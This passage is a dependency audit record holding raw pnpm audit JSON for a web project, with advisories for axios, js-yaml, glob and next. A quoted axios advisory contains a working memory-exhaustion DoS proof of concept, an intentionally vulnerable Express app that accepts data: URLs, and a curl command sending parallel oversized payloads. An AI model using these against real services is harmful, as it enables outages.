# Dependency Health Audit (2026-01-02)

> 目的：依赖项健康度审计（漏洞/过期）。
> 说明：依赖审计结果与 registry/锁文件有关；本文件记录“当下”输出，供后续升级闭环。

## pnpm audit --json

- exit code: 1

```
pnpm audit --json
```

### stdout

```json
{
  "actions": [
    {
      "action": "update",
      "resolves": [
        {
          "id": 1109802,
          "path": ".>eslint>@eslint/eslintrc>js-yaml",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "js-yaml",
      "target": "4.1.1",
      "depth": 4
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1109842,
          "path": "lawclick-next>jest>@jest/core>@jest/reporters>glob",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "glob",
      "target": "10.5.0",
      "depth": 5
    },
    {
      "action": "review",
      "module": "axios",
      "resolves": [
        {
          "id": 1098583,
          "path": "apps__web-frontend>axios",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1108263,
          "path": "apps__web-frontend>axios",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1111035,
          "path": "apps__web-frontend>axios",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "js-yaml",
      "resolves": [
        {
          "id": 1109801,
          "path": "apps__web-frontend>jest>@jest/core>@jest/transform>babel-plugin-istanbul>@istanbuljs/load-nyc-config>js-yaml",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "next",
      "resolves": [
        {
          "id": 1111368,
          "path": "apps__web-frontend>next",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1111374,
          "path": "apps__web-frontend>next",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1111383,
          "path": "apps__web-frontend>next",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    }
  ],
  "advisories": {
    "1098583": {
      "findings": [
        {
          "version": "1.6.2",
          "paths": [
            "apps\\web-frontend > axios@1.6.2"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-39338\n- https://github.com/axios/axios/releases\n- https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html\n- https://github.com/axios/axios/issues/6463\n- https://github.com/axios/axios/pull/6539\n- https://github.com/axios/axios/pull/6543\n- https://github.com/axios/axios/commit/6b6b605eaf73852fb2dae033f1e786155959de3a\n- https://github.com/axios/axios/releases/tag/v1.7.4\n- https://github.com/advisories/GHSA-8hc4-vh64-cxmj",
      "created": "2024-08-12T15:30:49.000Z",
      "id": 1098583,
      "npm_advisory_id": null,
      "overview": "axios 1.7.2 allows SSRF via unexpected behavior where requests for path relative URLs get processed as protocol relative URLs.",
      "reported_by": null,
      "title": "Server-Side Request Forgery in axios",
      "metadata": null,
      "cves": [
        "CVE-2024-39338"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "axios",
      "vulnerable_versions": ">=1.3.2 <=1.7.3",
      "github_advisory_id": "GHSA-8hc4-vh64-cxmj",
      "recommendation": "Upgrade to version 1.7.4 or later",
      "patched_versions": ">=1.7.4",
      "updated": "2024-08-13T19:53:25.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-918"
      ],
      "url": "https://github.com/advisories/GHSA-8hc4-vh64-cxmj"
    },
    "1108263": {
      "findings": [
        {
          "version": "1.6.2",
          "paths": [
            "apps\\web-frontend > axios@1.6.2"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/axios/axios/security/advisories/GHSA-4hjh-wcwx-xvwj\n- https://github.com/axios/axios/pull/7011\n- https://github.com/axios/axios/commit/945435fc51467303768202250debb8d4ae892593\n- https://github.com/axios/axios/releases/tag/v1.12.0\n- https://nvd.nist.gov/vuln/detail/CVE-2025-58754\n- https://github.com/axios/axios/pull/7034\n- https://github.com/axios/axios/commit/a1b1d3f073a988601583a604f5f9f5d05a3d0b67\n- https://github.com/axios/axios/releases/tag/v0.30.2\n- https://github.com/advisories/GHSA-4hjh-wcwx-xvwj",
      "created": "2025-09-11T21:07:55.000Z",
      "id": 1108263,
      "npm_advisory_id": null,
      "overview": "## Summary\n\nWhen Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env && config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');\n    if (asBlob) { return new _Blob([buffer], {type: mime}); }\n    return buffer;\n  }\n  throw new AxiosError('Unsupported protocol ' + protocol, ...);\n}\n```\n\n* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.\n* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.\n* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.\n\nIn comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err => {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n<--- Last few GCs --->\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body. It allows data: URLs which axios fully ignore `maxContentLength `, `maxBodyLength` and decodes into memory on Node before streaming enabling DoS.\n\n```js\nimport express from \"express\";\nimport morgan from \"morgan\";\nimport axios from \"axios\";\nimport http from \"node:http\";\nimport https from \"node:https\";\nimport { PassThrough } from \"node:stream\";\n\nconst keepAlive = true;\nconst httpAgent = new http.Agent({ keepAlive, maxSockets: 100 });\nconst httpsAgent = new https.Agent({ keepAlive, maxSockets: 100 });\nconst axiosClient = axios.create({\n  timeout: 10000,\n  maxRedirects: 5,\n  httpAgent, httpsAgent,\n  headers: { \"User-Agent\": \"axios-poc-link-preview/0.1 (+node)\" },\n  validateStatus: c => c >= 200 && c < 400\n});\n\nconst app = express();\nconst PORT = Number(process.env.PORT || 8081);\nconst BODY_LIMIT = process.env.MAX_CLIENT_BODY || \"50mb\";\n\napp.use(express.json({ limit: BODY_LIMIT }));\napp.use(morgan(\"combined\"));\n\napp.get(\"/healthz\", (req,res)=>res.send(\"ok\"));\n\n/**\n * POST /preview { \"url\": \"<http|https|data URL>\" }\n * Uses axios streaming but if url is data:, axios fully decodes into memory first (DoS vector).\n */\n\napp.post(\"/preview\", async (req, res) => {\n  const url = req.body?.url;\n  if (!url) return res.status(400).json({ error: \"missing url\" });\n\n  let u;\n  try { u = new URL(String(url)); } catch { return res.status(400).json({ error: \"invalid url\" }); }\n\n  // Developer allows using data:// in the allowlist\n  const allowed = new Set([\"http:\", \"https:\", \"data:\"]);\n  if (!allowed.has(u.protocol)) return res.status(400).json({ error: \"unsupported scheme\" });\n\n  const controller = new AbortController();\n  const onClose = () => controller.abort();\n  res.on(\"close\", onClose);\n\n  const before = process.memoryUsage().heapUsed;\n\n  try {\n    const r = await axiosClient.get(u.toString(), {\n      responseType: \"stream\",\n      maxContentLength: 8 * 1024, // Axios will ignore this for data:\n      maxBodyLength: 8 * 1024,    // Axios will ignore this for data:\n      signal: controller.signal\n    });\n\n    // stream only the first 64KB back\n    const cap = 64 * 1024;\n    let sent = 0;\n    const limiter = new PassThrough();\n    r.data.on(\"data\", (chunk) => {\n      if (sent + chunk.length > cap) { limiter.end(); r.data.destroy(); }\n      else { sent += chunk.length; limiter.write(chunk); }\n    });\n    r.data.on(\"end\", () => limiter.end());\n    r.data.on(\"error\", (e) => limiter.destroy(e));\n\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    limiter.pipe(res);\n  } catch (err) {\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    res.status(502).json({ error: String(err?.message || err) });\n  } finally {\n    res.off(\"close\", onClose);\n  }\n});\n\napp.listen(PORT, () => {\n  console.log(`axios-poc-link-preview listening on http://0.0.0.0:${PORT}`);\n  console.log(`Heap cap via NODE_OPTIONS, JSON limit via MAX_CLIENT_BODY (default ${BODY_LIMIT}).`);\n});\n```\nRun this app and send 3 post requests:\n```sh\nSIZE_MB=35 node -e 'const n=+process.env.SIZE_MB*1024*1024; const b=Buffer.alloc(n,65).toString(\"base64\"); process.stdout.write(JSON.stringify({url:\"data:application/octet-stream;base64,\"+b}))' \\\n| tee payload.json >/dev/null\nseq 1 3 | xargs -P3 -I{} curl -sS -X POST \"$URL\" -H 'Content-Type: application/json' --data-binary @payload.json -o /dev/null```\n```\n\n---\n\n## Suggestions\n\n1. **Enforce size limits**\n   For `protocol === 'data:'`, inspect the length of the Base64 payload before decoding. If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.",
      "reported_by": null,
      "title": "Axios is vulnerable to DoS attack through lack of data size check",
      "metadata": null,
      "cves": [
        "CVE-2025-58754"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "axios",
      "vulnerable_versions": ">=1.0.0 <1.12.0",
      "github_advisory_id": "GHSA-4hjh-wcwx-xvwj",
      "recommendation": "Upgrade to version 1.12.0 or later",
      "patched_versions": ">=1.12.0",
      "updated": "2025-09-29T19:03:58.000Z",
      "cvss": {
        "score": 7.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
      },
      "cwe": [
        "CWE-770"
      ],
      "url": "https://github.com/advisories/GHSA-4hjh-wcwx-xvwj"
    },
    "1109801": {
      "findings": [
        {
          "version": "3.14.1",
          "paths": [
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-resolve-dependencies@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > @jest/core@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-resolve-dependencies@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "apps\\web-frontend > @testing-library/jest-dom@6.2.0 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
